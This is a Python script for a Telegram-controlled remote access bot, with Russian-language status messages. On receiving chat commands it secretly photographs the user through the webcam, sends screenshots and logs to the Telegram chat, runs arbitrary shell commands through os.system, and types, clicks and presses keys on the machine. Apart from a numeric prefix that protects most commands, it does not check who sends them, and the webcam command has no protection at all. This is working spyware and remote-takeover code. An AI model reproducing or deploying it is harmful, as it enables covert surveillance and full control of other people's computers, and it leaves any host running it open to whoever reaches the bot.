import cv2
import telebot
import time
import os
import logging
import keyboard
from pyautogui import *
from datetime import datetime

# ---------------------------------
# VVV YOUR BOT TOKEN
token='YOUR BOT TG TOKEN'
# ---------------------------------

logging.basicConfig(level=logging.INFO, filename="logs.log",filemode="w", format="%(asctime)s %(levelname)s %(message)s")
rlgs = " "
sysmode = 0
alertmode = 0
writemode = 0
bot=telebot.TeleBot(token)
@bot.message_handler(content_types=['text'])
def message_reply(message):
    global rlgs
    global sysmode
    global alertmode
    global writemode
    if message.text=="cam1":
        current_datetime = datetime.now()
        print("CAMERA @" + str(message.from_user.username))
        write_data_time = str(current_datetime)
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite("camera1.png", frame)
        cap.release()
        logging.info("CAMERA @" + str(message.from_user.username))
        photo = open('camera1.png', 'rb')
        bot.send_photo(message.chat.id, photo)
        photo.close()
    elif message.text=="7831_logs":
        logf = open("logs.log", "r")
        for line in logf:
            try:
                bot.send_message(message.chat.id, logf.readline())
            except:
                x = 6
        logf.close()
    elif message.text=="7831_screenshot":
        current_datetime = datetime.now()
        write_data_time = str(current_datetime)
        print(write_data_time + " SCREENSHOT @" + str(message.from_user.username))
        
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT @" + str(message.from_user.username))
        
        bot.send_photo(message.chat.id, scre)
    elif message.text=="7831_7_sys":
        if sysmode == 1:
            sysmode = 0
            bot.send_message(message.chat.id, "Режим консоли успешно выключён!")
        else:
            sysmode = 1
            bot.send_message(message.chat.id, "Режим консоли успешно включён!")
    elif sysmode == 1:
        if sysmode == 1:
            os.system(message.text)
            bot.send_message(message.chat.id, "Выполнена команда на ПК!")
    elif message.text=="7831_alertmode":
        if alertmode == 1:
            alertmode = 0
            bot.send_message(message.chat.id, "Режим сообщения успешно выключён!")
        else:
            alertmode = 1
            bot.send_message(message.chat.id, "Режим сообщения успешно включён!")
    elif message.text=="7831_writemode":
        if writemode == 1:
            writemode = 0
            bot.send_message(message.chat.id, "Режим печатанья успешно выключён!")
        else:
            writemode = 1
            bot.send_message(message.chat.id, "Режим печатанья успешно включён!")
    elif message.text=="7831_click":
        click()
        bot.send_message(message.chat.id, "Выполнено нажатие мыши!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY CLICK @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif message.text == "7831_dclick":
        doubleClick()
        bot.send_message(message.chat.id, "Выполнено двойное нажатие мыши!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY DCLICK @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif message.text == "7831_kb_esc":
        press("esc")
        bot.send_message(message.chat.id, "Нажато ESCAPE!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY ESCAPE @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif message.text == "7831_kb_enter":
        press("enter")
        bot.send_message(message.chat.id, "Нажато ENTER!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY ENTER @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif message.text == "7831_win_lock":
        hotkey('windows', 'l')
        bot.send_message(message.chat.id, "В данный момент команда не работает!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY WINLOCK @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif message.text == "7831_alt_tab":
        hotkey('alt', 'tab')
        bot.send_message(message.chat.id, "Отправлено!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY ALTTAB @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif alertmode == 1:
        alert(message.text)
        bot.send_message(message.chat.id, "Отправлено!")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY ALERT @" + str(message.from_user.username))
        bot.send_photo(message.chat.id, scre)
    elif writemode == 1:
        write(message.text, interval=0.00001)
        bot.send_message(message.chat.id, "Успешно! Будет прислан скриншот с результатом.")
        screenshot("screen.png")
        scre = open('screen.png', 'rb')
        logging.info("SCREENSHOT BY WRITE @" + str(message.from_user.username))
        
        bot.send_photo(message.chat.id, scre)
bot.infinity_polling()
